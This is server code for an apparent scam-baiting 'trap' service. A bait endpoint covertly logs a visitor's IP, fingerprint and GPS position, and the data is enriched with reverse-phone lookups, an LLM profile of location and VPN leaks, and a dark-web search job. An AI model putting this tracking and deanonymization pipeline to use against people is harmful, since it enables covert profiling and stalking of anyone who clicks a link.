  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body class="bg-zinc-950 text-white">
  <div class="max-w-7xl mx-auto p-8">
    <div class="flex justify-between items-center mb-8">
      <h1 class="text-4xl font-bold text-lime-400">Sentinel Trap Live Dashboard</h1>
    </div>

    <div id="liveLog" class="space-y-6"></div>
  </div>

  <script>
    const socket = io();
    const logDiv = document.getElementById('liveLog');

    socket.on('live-click', (data) => {
      const entry = document.createElement('div');
      entry.className = 'bg-zinc-900 p-6 rounded-2xl border border-lime-400';
      entry.innerHTML = \`
        <div class="flex justify-between">
          <span class="font-bold">Trap ID: \${data.trapId}</span>
          <span class="text-xs text-zinc-400">\${new Date().toLocaleTimeString()}</span>
        </div>
        <div class="grid grid-cols-2 gap-4 mt-4">
          <div>IP: <span class="font-mono">\${data.ip}</span></div>
          <div>VisitorID: <span class="font-mono">\${data.visitorId || '—'}</span></div>
          <div>Country/ASN: \${data.ipinfo?.country || '—'} / \${data.ipinfo?.org || '—'}</div>
          <div>Abuse Score: \${data.abuse?.abuseConfidenceScore || 0}%</div>
        </div>
        <div class="mt-4 text-sm text-lime-300">AI Scammer Profile: \${data.aiProfile ? data.aiProfile.substring(0, 180) + '...' : '—'}</div>
        <button onclick="this.parentElement.querySelector('.raw').classList.toggle('hidden')" class="text-xs mt-4 underline">Show Raw JSON</button>
        <pre class="raw hidden mt-4 text-xs bg-black p-4 overflow-auto">\${JSON.stringify(data, null, 2)}</pre>
      \`;
      logDiv.prepend(entry);
    });
  </script>
</body>
</html>`);
});


// Per-IP rate limits for the public scammer-facing endpoints so they can't
// be abused to flood the database or socket.io with junk events.
const trackLimiter = rateLimit({ windowMs: 60_000, max: 30 });
const liveLimiter = rateLimit({ windowMs: 60_000, max: 30 });

function getClientIp(req) {
  // `trust proxy` is set, so Express parses `x-forwarded-for` for us and
  // `req.ip` is the first (client) hop rather than a downstream proxy.
  return req.ip || req.socket.remoteAddress || null;
}

async function trapExists(trapId) {
  // Accept both legacy lowercase-alphanumeric IDs (8 chars from the old
  // Math.random generator) and current hex IDs (12 chars from randomBytes).
  if (typeof trapId !== 'string' || !/^[a-z0-9]{6,32}$/.test(trapId)) return false;
  try {
    const r = await pool.query('SELECT 1 FROM traps WHERE id = $1', [trapId]);
    return r.rowCount > 0;
  } catch (e) {
    console.error('trapExists query failed:', e.message);
    return false;
  }
}

// TRACK — runs enrichment (ipinfo / AbuseIPDB / OpenRouter AI), persists to
// the `clicks` table, and emits `live-click` over socket.io so the admin
// portal sees the event in real time. The response returns immediately and
// enrichment happens in the background so the bait page can redirect without
// waiting for up to ~20s of third-party API timeouts. All external
// enrichment is optional: missing API keys just skip that field.
app.post('/api/track', trackLimiter, async (req, res) => {
  const body = req.body || {};
  const { trapId } = body;
  const clientIp = getClientIp(req);

  console.log(`📍 Track request received: trapId=${trapId}, ip=${clientIp}, ts=${new Date().toISOString()}`);

  if (!(await trapExists(trapId))) {
    console.warn(`⚠️  Track rejected: unknown trapId=${trapId}`);
    return res.status(404).json({ error: 'unknown trap' });
  }

  // Acknowledge immediately so the client can redirect without blocking on
  // external API timeouts.
  res.json({ ok: true });

  setImmediate(async () => {
    try {
      let ipinfo = null, abuse = null, aiProfile = null, hostnames = null,
          trestle = null, apify = null;

      // Phone number is optional and can arrive from anywhere the bait page
      // wants to supply it — typically a `?phone=` query-string param on the
      // trap URL passed through into the /api/track POST body. Accept a few
      // common shapes so callers don't have to follow one strict convention.
      const rawPhone = (body.phone || (body.research && body.research.phone) || '').toString().trim();
      // Strip everything except digits and a leading `+` so Trestle / Apify
      // get a stable E.164-ish form. Empty string → feature is skipped.
      // Normalize: drop any char that isn't a digit or `+`, then drop any `+`
      // that isn't the very first character.
      const phone = rawPhone
        ? rawPhone.replace(/[^\d+]/g, '').replace(/(?!^)\+/g, '')
        : '';

      // Reverse-DNS — cheap, no API key, sometimes leaks ISP customer
      // hostname like `c-73-x-x-x.hsd1.wa.comcast.net` which gives a
      // coarse geographic + carrier hint.
      if (clientIp) {
        try {
          hostnames = await dns.reverse(clientIp);
          console.log(`🔎 Reverse DNS: ${hostnames.join(', ')}`);
        } catch (e) { /* common: no PTR record */ }
      }

      if (process.env.IPINFO_TOKEN && clientIp) {
        console.log(`🌐 Fetching ipinfo for ${clientIp}...`);
        try {
          const r = await axios.get(
            `https://ipinfo.io/${encodeURIComponent(clientIp)}`,
            { params: { token: process.env.IPINFO_TOKEN }, timeout: 5000 }
          );
          ipinfo = r.data;
          console.log(`✅ ipinfo: country=${ipinfo.country}, org=${ipinfo.org}`);
        } catch (e) { console.error('❌ ipinfo failed:', e.message); }
      } else {
        console.log('ℹ️  ipinfo skipped (no IPINFO_TOKEN or no IP)');
      }

      if (process.env.ABUSEIPDB_KEY && clientIp) {
        console.log(`🔍 Fetching AbuseIPDB for ${clientIp}...`);
        try {
          const r = await axios.get('https://api.abuseipdb.com/api/v2/check', {
            params: { ipAddress: clientIp, maxAgeInDays: 90 },
            headers: { Key: process.env.ABUSEIPDB_KEY, Accept: 'application/json' },
            timeout: 5000
          });
          abuse = r.data && r.data.data;
          console.log(`✅ AbuseIPDB: score=${abuse && abuse.abuseConfidenceScore}`);
        } catch (e) { console.error('❌ abuseipdb failed:', e.message); }
      } else {
        console.log('ℹ️  AbuseIPDB skipped (no ABUSEIPDB_KEY or no IP)');
      }

      // Trestle reverse-phone enrichment — caller_id / phone_intel / cnam.
      // Requires a phone number (supplied per-run by the bait page in the
      // POST body as `phone`) and TRESTLE_KEY. All three endpoints are hit in
      // parallel; individual endpoint failures are swallowed so one 404 from
      // e.g. cnam doesn't lose the other two responses.
      if (process.env.TRESTLE_KEY && phone) {
        console.log(`📞 Fetching Trestle reverse-phone for ${phone}...`);
        const headers = { accept: 'application/json', 'x-api-key': process.env.TRESTLE_KEY };
        const trestleGet = async (url, label) => {
          try {
            const r = await axios.get(url, { headers, params: { phone }, timeout: 6000 });
            return r.data;
          } catch (e) {
            const status = e && e.response && e.response.status;
            console.error(`❌ trestle ${label} failed:${status ? ' HTTP ' + status : ''} ${e.message}`);
            return null;
          }
        };
        const [caller_id, phone_intel, cnam] = await Promise.all([
          trestleGet('https://api.trestleiq.com/3.1/caller_id', 'caller_id'),
          trestleGet('https://api.trestleiq.com/3.0/phone_intel', 'phone_intel'),
          trestleGet('https://api.trestleiq.com/3.1/cnam',       'cnam'),
        ]);
        trestle = { phone, caller_id, phone_intel, cnam };
        console.log(`✅ Trestle: caller_id=${!!caller_id} phone_intel=${!!phone_intel} cnam=${!!cnam}`);
      } else if (process.env.TRESTLE_KEY) {
        console.log('ℹ️  Trestle skipped (no phone number in request body)');
      } else {
        console.log('ℹ️  Trestle skipped (no TRESTLE_KEY)');
      }

      if (process.env.OPENROUTER_KEY) {
        console.log('🤖 Requesting AI profile from OpenRouter...');
        const summary = {
          ip: clientIp, ua: body.ua, ipinfo, abuse, hostnames, trestle,
          timezone: body.timezone, languages: body.languages, screen: body.screen,
          // Research-mode signals — always included so the AI can attempt
          // a best-effort probabilistic identity / location / carrier guess.
          research: body.research || null
        };
        const promptContent =
          'You are profiling a likely-scammer click for a defensive anti-scam ' +
          'tool. Using ONLY the structured signals below, give a concise ' +
          'probabilistic profile. Where the data supports it, include best-' +
          'guess hypotheses (clearly hedged with confidence words like ' +
          '"likely" / "possibly") for: approximate location (city / region / ' +
          'postal area), likely ISP or mobile carrier, device class (mobile ' +
          'vs desktop), whether they are likely behind a VPN/proxy/Tor (note ' +
          'any WebRTC IP leak vs reported IP), and a one-line behavioural ' +
          'summary. Do NOT invent names, phone numbers, street addresses, or ' +
          'any specific personal identifiers that are not derivable from the ' +
          'data. Keep it under ~8 short bullet points.\n\n' +
          JSON.stringify(summary);

        // OpenRouter's canonical reasoning parameter is `reasoning: { effort }`.
        // The top-level `reasoning_effort` is an OpenAI-only field that
        // OpenRouter rejects with HTTP 400 on many models. Some models also
        // don't support reasoning at all — if the request 400s with reasoning
        // attached, retry once without it so non-reasoning models still work.
        const baseReq = {
          model: process.env.OPENROUTER_MODEL || 'openai/gpt-5.2',
          messages: [{ role: 'user', content: promptContent }]
        };
        const callOR = (extra) => axios.post(
          'https://openrouter.ai/api/v1/chat/completions',
          Object.assign({}, baseReq, extra),
          {
            headers: {
              Authorization: `Bearer ${process.env.OPENROUTER_KEY}`,
              'Content-Type': 'application/json',
              // OpenRouter recommends these for attribution / rate-limit tier.
              'HTTP-Referer': process.env.OPENROUTER_REFERER || 'https://github.com/nickm538/Sentinel',
              'X-Title': 'Sentinel Trap'
            },
            timeout: 15000
          }
        );

        const logOrError = (label, e) => {
          const status = e && e.response && e.response.status;
          const data = e && e.response && e.response.data;
          const detail = data ? (typeof data === 'string' ? data : JSON.stringify(data)) : '';
          console.error(
            `❌ openrouter ${label}: ${e.message}` +
            (status ? ` (HTTP ${status})` : '') +
            (detail ? ` — ${detail}` : '')
          );
        };

        try {
          let r;
          try {
            r = await callOR({ reasoning: { effort: 'high' } });
          } catch (e1) {
            const status = e1 && e1.response && e1.response.status;
            if (status === 400) {
              logOrError('first attempt 400, retrying without reasoning', e1);
              r = await callOR({});
            } else {
              throw e1;
            }
          }
          aiProfile = r.data && r.data.choices && r.data.choices[0] && r.data.choices[0].message && r.data.choices[0].message.content;
          console.log(`✅ AI profile generated (${aiProfile ? aiProfile.length : 0} chars)`);
        } catch (e) {
          logOrError('failed', e);
        }
      } else {
        console.log('ℹ️  OpenRouter skipped (no OPENROUTER_KEY)');
      }

      // Apify deep/dark-web actor — resurrect an existing run with a fresh,
      // per-click INPUT payload built from everything we already know about
      // the scammer (IP, phone, hostnames, ipinfo, webrtc candidates, UA).
      // Resurrect is fire-and-forget: dark-web crawls take minutes, so we
      // only record the run handle now and let the admin fetch results later
      // via /api/apify-run/:runId (see below).
      //
      // Required env: APIFY_TOKEN, APIFY_ACTOR_RUN_ID (the run to resurrect).
      // The default key-value store is discovered automatically from the run
      // metadata, so no extra env var is needed for the INPUT store id.
      const apifyToken = process.env.APIFY_TOKEN;
      const apifyRunId = process.env.APIFY_ACTOR_RUN_ID;
      if (apifyToken && apifyRunId) {
        console.log(`🕸️  Apify: preparing deep-web search run ${apifyRunId}...`);
        const webrtcIps = Array.isArray(body.research && body.research.webrtc)
          ? Array.from(new Set(body.research.webrtc.map(c => c && c.ip).filter(Boolean)))
          : [];
        const apifyInput = {
          ip: clientIp,
          phone: phone || null,
          userAgent: body.ua || null,
          hostnames: hostnames || [],
          webrtcIps,
          location: ipinfo ? {
            country: ipinfo.country, region: ipinfo.region,
            city: ipinfo.city, postal: ipinfo.postal, loc: ipinfo.loc, org: ipinfo.org,
          } : null,
          trestle: trestle || null,
          trapId,
          triggeredAt: new Date().toISOString(),
        };
        try {
          const meta = await axios.get(
            `https://api.apify.com/v2/actor-runs/${encodeURIComponent(apifyRunId)}`,
            { params: { token: apifyToken }, timeout: 6000 }
          );
          const kvsId = meta.data && meta.data.data && meta.data.data.defaultKeyValueStoreId;
          if (!kvsId) throw new Error('run has no defaultKeyValueStoreId');

          await axios.put(
            `https://api.apify.com/v2/key-value-stores/${encodeURIComponent(kvsId)}/records/INPUT`,
            apifyInput,
            { params: { token: apifyToken }, headers: { 'Content-Type': 'application/json' }, timeout: 6000 }
          );

          const res = await axios.post(
            `https://api.apify.com/v2/actor-runs/${encodeURIComponent(apifyRunId)}/resurrect`,
            null,
            { params: { token: apifyToken }, timeout: 6000 }
          );
          const run = res.data && res.data.data;
          apify = {
            runId: run && run.id || apifyRunId,
            status: run && run.status || null,
            startedAt: run && (run.startedAt || run.modifiedAt) || null,
            keyValueStoreId: kvsId,
            inputKeys: Object.keys(apifyInput),
          };
          console.log(`✅ Apify run resurrected: status=${apify.status} kvs=${kvsId}`);
        } catch (e) {
          const status = e && e.response && e.response.status;
          const detail = e && e.response && e.response.data;
          console.error(
            `❌ apify failed: ${e.message}` +
            (status ? ` (HTTP ${status})` : '') +
            (detail ? ` — ${typeof detail === 'string' ? detail : JSON.stringify(detail)}` : '')
          );
          apify = { error: e.message, runId: apifyRunId };
        }
      } else if (apifyToken || apifyRunId) {
        console.log('ℹ️  Apify skipped (need both APIFY_TOKEN and APIFY_ACTOR_RUN_ID)');
      } else {
        console.log('ℹ️  Apify skipped (no APIFY_TOKEN)');
      }

      // Strip client-supplied ip so it can't override the server-derived value.
      const { ip: _ignored, ...safeBody } = body;
      const enriched = Object.assign({}, safeBody, { ip: clientIp, ipinfo, abuse, aiProfile, hostnames, trestle, apify });

      try {
        await pool.query('INSERT INTO clicks (trap_id, data) VALUES ($1, $2)', [trapId, enriched]);
        console.log(`💾 Click inserted into DB: trapId=${trapId}, ip=${clientIp}`);
      } catch (e) { console.error('❌ clicks insert failed:', e.message); }

      io.emit('live-click', enriched);
      console.log(`📡 socket.io live-click emitted: trapId=${trapId}`);
    } catch (e) {
      console.error('❌ track background processing failed:', e);
    }
  });
});




// RESEARCH LIVE — geolocation / extra signals captured from the scammer.
// Requires a valid `trapId` (anti-spam), whitelists the accepted fields, and
// is rate-limited per IP. Persists to `live_events` and emits
// `research-live` so the admin portal can show it alongside the click feed.
app.post('/api/live', liveLimiter, async (req, res) => {
  const body = req.body || {};
  const { trapId } = body;

  if (!(await trapExists(trapId))) {
    return res.status(404).json({ error: 'unknown trap' });
  }

  const numericFields = ['latitude', 'longitude', 'accuracy', 'altitude', 'altitudeAccuracy', 'heading', 'speed', 'timestamp'];
  const clean = { trapId };
  for (const k of numericFields) {
    if (body[k] === undefined || body[k] === null) continue;
    const v = Number(body[k]);
    if (!Number.isFinite(v)) {
      return res.status(400).json({ error: `invalid ${k}` });
    }
    clean[k] = v;
  }
  clean.receivedAt = new Date().toISOString();

  try {
    await pool.query('INSERT INTO live_events (data) VALUES ($1)', [clean]);
  } catch (e) { console.error('live insert failed:', e.message); }
  io.emit('research-live', clean);
  res.sendStatus(200);
});

// Apify proxy — admin-gated surface of the three relevant Apify v2 endpoints
// so the portal (or a human operator) can inspect a resurrected deep-web
// search run without exposing APIFY_TOKEN to the browser. The token stays
// server-side; the admin just provides the runId, which defaults to
// APIFY_ACTOR_RUN_ID.
//
//   GET /api/apify-run/:runId            → run metadata (status, finishedAt, ...)
//   GET /api/apify-run/:runId/input      → last INPUT the actor ran with
//   GET /api/apify-run/:runId/log        → raw log text (last 256 KB)
//   POST /api/apify-run/:runId/resurrect → relaunch the run (same input)
app.get('/api/apify-run/:runId', adminLimiter, adminAuth, async (req, res) => {
  const token = process.env.APIFY_TOKEN;
  if (!token) return res.status(503).json({ error: 'APIFY_TOKEN not set' });
  try {
    const r = await axios.get(
      `https://api.apify.com/v2/actor-runs/${encodeURIComponent(req.params.runId)}`,
      { params: { token }, timeout: 8000 }
    );
    res.json(r.data);
  } catch (e) {
    res.status(e.response?.status || 502).json({ error: e.message, detail: e.response?.data });
  }
});

app.get('/api/apify-run/:runId/input', adminLimiter, adminAuth, async (req, res) => {
  const token = process.env.APIFY_TOKEN;
  if (!token) return res.status(503).json({ error: 'APIFY_TOKEN not set' });
  try {
    const meta = await axios.get(
      `https://api.apify.com/v2/actor-runs/${encodeURIComponent(req.params.runId)}`,
      { params: { token }, timeout: 8000 }
    );
    const kvsId = meta.data?.data?.defaultKeyValueStoreId;
    if (!kvsId) return res.status(404).json({ error: 'run has no defaultKeyValueStoreId' });
    const r = await axios.get(
      `https://api.apify.com/v2/key-value-stores/${encodeURIComponent(kvsId)}/records/INPUT`,
      { params: { token }, timeout: 8000 }
    );
    res.json(r.data);
  } catch (e) {
    res.status(e.response?.status || 502).json({ error: e.message, detail: e.response?.data });
  }
});

app.get('/api/apify-run/:runId/log', adminLimiter, adminAuth, async (req, res) => {
  const token = process.env.APIFY_TOKEN;
  if (!token) return res.status(503).json({ error: 'APIFY_TOKEN not set' });
  try {
    const r = await axios.get(
      `https://api.apify.com/v2/logs/${encodeURIComponent(req.params.runId)}`,
      { params: { token }, timeout: 10000, responseType: 'text', transformResponse: [x => x] }
    );
    const text = typeof r.data === 'string' ? r.data : String(r.data);
    res.type('text/plain').send(text.slice(-256 * 1024));
  } catch (e) {
    res.status(e.response?.status || 502).json({ error: e.message });
  }
});

app.post('/api/apify-run/:runId/resurrect', adminLimiter, adminAuth, async (req, res) => {
  const token = process.env.APIFY_TOKEN;
  if (!token) return res.status(503).json({ error: 'APIFY_TOKEN not set' });
  try {
    const r = await axios.post(
      `https://api.apify.com/v2/actor-runs/${encodeURIComponent(req.params.runId)}/resurrect`,
      null,
      { params: { token }, timeout: 8000 }
    );
    res.json(r.data);
  } catch (e) {
    res.status(e.response?.status || 502).json({ error: e.message, detail: e.response?.data });
  }
});

// BrowserLeaks WebRTC — agentic, headless-browser scrape of
// https://browserleaks.com/webrtc. That page has no public API; it only
// exposes its data through JS that runs in a real browser. So we launch
// headless Chromium via Playwright, let the page's own WebRTC stack gather
// candidates against its STUN list, and scrape the resulting IP tables.
//
// ⚠️  IMPORTANT CAVEAT. This runs on the Sentinel *server*, so the IPs it
// reports are the Sentinel host's public / STUN IPs, NOT the scammer's.
// That makes this endpoint useful for two things only:
//
//   1. Diagnostics / self-test — confirm what Sentinel itself looks like
//      to the outside world (e.g. Railway's egress IP, whether a proxy is
//      masking it, what STUN returns for the server's NAT).
//   2. Comparison baseline — if a click's `data.research.webrtc` IPs look
//      suspiciously close to the values returned here, that's a signal
//      the "scammer" is actually you testing your own trap.
//
// To actually get browserleaks-grade leak data on the scammer, we do the
// same STUN-based candidate harvest in the scammer's own browser — see
// `captureWebRtcCandidates()` in the bait page, which now uses the same
// broad STUN list browserleaks does.
//
// Opt-in. Requires `playwright` to be installed AND `BROWSERLEAKS_ENABLED=true`
// in the Railway environment. If either is missing, the endpoint returns 501
// with instructions instead of crashing the server at boot — keeping the
// baseline install lean.
app.get('/api/browserleaks/webrtc', adminLimiter, adminAuth, async (req, res) => {
  if (process.env.BROWSERLEAKS_ENABLED !== 'true') {
    return res.status(501).json({
      error: 'disabled',
      hint: 'Set BROWSERLEAKS_ENABLED=true in Railway Variables to enable this endpoint.',
    });
  }
  let playwright;
  try {
    // Dynamic require so the baseline install stays light — Playwright + its
    // bundled Chromium is ~300 MB and not every deployment needs it.
    playwright = require('playwright');
  } catch (_) {
    return res.status(501).json({
      error: 'playwright not installed',
      hint: 'Install with:  npm install playwright  &&  npx playwright install --with-deps chromium',
    });
  }
  let browser;
  try {
    browser = await playwright.chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto('https://browserleaks.com/webrtc', { waitUntil: 'domcontentloaded', timeout: 20000 });
    // The page populates its WebRTC IP table asynchronously as STUN responses
    // arrive. 6s is comfortably above normal gathering time.
    await page.waitForTimeout(6000);

    // Scrape: the page renders a <table> with pairs of labels ("Local IP",
    // "Public IP", "IPv6", "Media Devices", etc.) and values. Pull every
    // labelled row plus any IP-looking token anywhere on the page as a
    // fallback, so the endpoint keeps working if browserleaks restyles.
    const scraped = await page.evaluate(() => {
      const rows = {};
      document.querySelectorAll('tr').forEach(tr => {
        const cells = tr.querySelectorAll('th,td');
        if (cells.length >= 2) {
          const label = (cells[0].innerText || '').trim();
          const value = (cells[1].innerText || '').trim();
          if (label) rows[label] = value;
        }
      });
      const text = document.body ? document.body.innerText : '';
      const ipv4 = Array.from(new Set((text.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/g) || [])));
      const ipv6 = Array.from(new Set((text.match(/\b(?:[A-F0-9]{1,4}:){2,7}[A-F0-9]{1,4}\b/gi) || [])));
      return { rows, ipv4, ipv6 };
    });

    res.json({
      source: 'https://browserleaks.com/webrtc',
      note: 'These IPs belong to the Sentinel server, not the scammer. See endpoint docstring.',
      fetchedAt: new Date().toISOString(),
      ...scraped,
    });
  } catch (e) {
    res.status(502).json({ error: 'browserleaks scrape failed', detail: e.message });
  } finally {
    if (browser) { try { await browser.close(); } catch (_) {} }
  }
});

// Historical clicks for the admin portal. Gated behind admin auth because the
// payloads include IPs, fingerprints, and enrichment data.
app.get('/api/clicks', adminLimiter, adminAuth, async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT trap_id, data, created_at FROM clicks ORDER BY created_at DESC LIMIT 100'
    );
    // Include trap_id inside the data blob so the existing renderer (which
    // reads `data.trapId`) keeps working even for rows where the client
    // payload didn't echo it back.
    const rows = result.rows.map(r => ({
      data: Object.assign({}, r.data || {}, { trapId: r.trap_id }),
      created_at: r.created_at,
    }));
    res.json(rows);
  } catch (e) {
    console.error('clicks query failed:', e.message);
    res.status(500).json({ error: 'failed to load clicks' });
  }
});

// Historical research-mode events for the admin portal. Gated behind admin
// auth because the payloads include precise geolocation.
app.get('/api/live-events', adminLimiter, adminAuth, async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT data, created_at FROM live_events ORDER BY created_at DESC LIMIT 100'
    );
    res.json(result.rows);
  } catch (e) {
    res.status(500).json({ error: 'failed to load live events' });
  }
});

io.on('connection', (socket) => {
  console.log(`🔌 socket.io client connected: id=${socket.id}`);
  socket.on('disconnect', (reason) => {
    console.log(`🔌 socket.io client disconnected: id=${socket.id}, reason=${reason}`);
  });
});


server.listen(process.env.PORT || 3000, () => console.log('🚀 Sentinel Trap v4 FULLY LIVE — robust frontend deployed'));